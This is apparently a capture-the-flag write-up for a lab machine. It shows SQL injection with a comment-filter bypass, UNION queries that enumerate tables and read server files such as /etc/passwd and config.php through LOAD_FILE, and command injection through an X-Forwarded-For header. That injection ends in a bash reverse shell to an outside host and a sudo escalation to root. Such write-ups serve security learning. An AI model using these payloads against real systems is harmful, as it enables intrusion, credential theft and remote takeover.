# SQL Injection

## Finding the vulnerability
- The form POSTs the `player` parameter to `index.php` via AJAX.
- The app returns one of two responses:
  - `Sorry, X you are not eligible...` → player exists in the DB
  - `Congratulations X you may compete...` → player not found (or a SQL error)
- A single quote flips the result, confirming SQL injection:
  - `player=ippsec` → not eligible
  - `player=ippsec'` → eligible (syntax error, 0 rows returned)
  - `player=ippsec'-- -` → not eligible (comment closes the query again)

```bash
curl -s -X POST http://10.129.96.75/index.php --data 'player=ippsec'       # not eligible
curl -s -X POST http://10.129.96.75/index.php --data "player=ippsec'"       # eligible (error)
curl -s -X POST http://10.129.96.75/index.php --data "player=ippsec'-- -"   # not eligible
```

## Reading source code (LOAD_FILE)
- The DB user has `FILE` privilege, so `LOAD_FILE()` works through the injection.
- Used it to read the web app source and discover creds + the query logic.

```bash
player=zzz' UNION SELECT LOAD_FILE('/etc/passwd')-- -
player=zzz' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -
player=zzz' UNION SELECT LOAD_FILE('/var/www/html/index.php')-- -
player=zzz' UNION SELECT LOAD_FILE('/var/www/html/challenge.php')-- -
player=zzz' UNION SELECT LOAD_FILE('/var/www/html/firewall.php')-- -
```

- `index.php` revealed the query and the "SQLMap Killer" filter:
  - Query: `SELECT player FROM players WHERE player = '<input>';` (1 column)
  - Input is lowercased, and blocks `sleep`, `0x`, `**`, `ifnull`, ` or `, and `-- <4 alnum chars>`
  - The `-- -` comment bypassed it because the char after `-- ` is a dash, not alphanumeric.

## UNION injection → flag 1
- Column count = 1 (brute-forced `UNION SELECT 1`, `1,2`, ... until it matched).
- Used a non-existent player (`zzz`) so the injected row becomes the first result and gets echoed.
- Enumerated: `database()` → `november`, tables → `flag` + `players`.
- `flag` table has a single column named `one`.

```bash
player=zzz' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -   # flag
player=zzz' UNION SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 0,1-- -      # one
player=zzz' UNION SELECT one FROM flag-- -                                                                       # the flag
```

# Privilege Escalation
- `firewall.php` (unlocked after submitting flag 1 to `challenge.php`) has command injection:

```php
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

- The `X-Forwarded-For` header is concatenated unsanitized into a `system()` call.
- First authenticate the session, then inject:

```bash
curl -s -c cookies.txt -X POST http://10.129.96.75/challenge.php --data 'flag=UHC{F1rst_5tep_2_Qualify}'
curl -s -b cookies.txt -H 'X-Forwarded-For: 127.0.0.1; id; #' http://10.129.96.75/firewall.php
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- Reverse shell (runs as `www-data`):

```http
X-Forwarded-For: 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.207/9002 0>&1'; #
```

- `www-data` has full NOPASSWD sudo → `sudo su` → root.
- Root flag: `/root/root.txt`
